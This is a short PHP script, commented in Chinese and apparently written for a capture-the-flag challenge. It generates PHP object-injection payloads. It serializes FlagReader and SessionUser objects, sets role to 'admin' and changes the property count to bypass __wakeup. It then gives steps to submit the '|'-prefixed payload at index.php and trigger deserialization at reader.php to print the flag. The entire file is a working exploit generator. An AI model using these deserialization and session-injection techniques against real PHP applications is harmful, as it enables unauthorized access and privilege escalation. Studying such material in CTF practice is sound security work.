<?php
// POC生成器

class FlagReader {
    public $source = 'trusted';
}

class SessionUser {
    public $username;
    public $role;
    public $avatar;
}

// 绕过__wakeup的payload（增加属性数量）
$fr = new FlagReader();
$payload1 = serialize($fr);
// 修改属性数量绕过__wakeup
$payload1 = str_replace('FlagReader":1:', 'FlagReader":2:', $payload1);

echo "Payload 1 (绕过__wakeup):\n";
echo "|" . $payload1 . "\n\n";

// 使用SessionUser触发的payload
$user = new SessionUser();
$user->username = $fr;
$user->role = 'admin';

$payload2 = serialize($user);
$payload2 = str_replace('FlagReader":1:', 'FlagReader":2:', $payload2);

echo "Payload 2 (通过SessionUser):\n";
echo "|" . $payload2 . "\n\n";

// 提示
echo "使用方法:\n";
echo "1. 在 index.php 提交上述payload（注意|符号）\n";
echo "2. 然后访问 reader.php 触发反序列化\n";
echo "3. FlagReader对象被反序列化时会输出flag\n";
?>
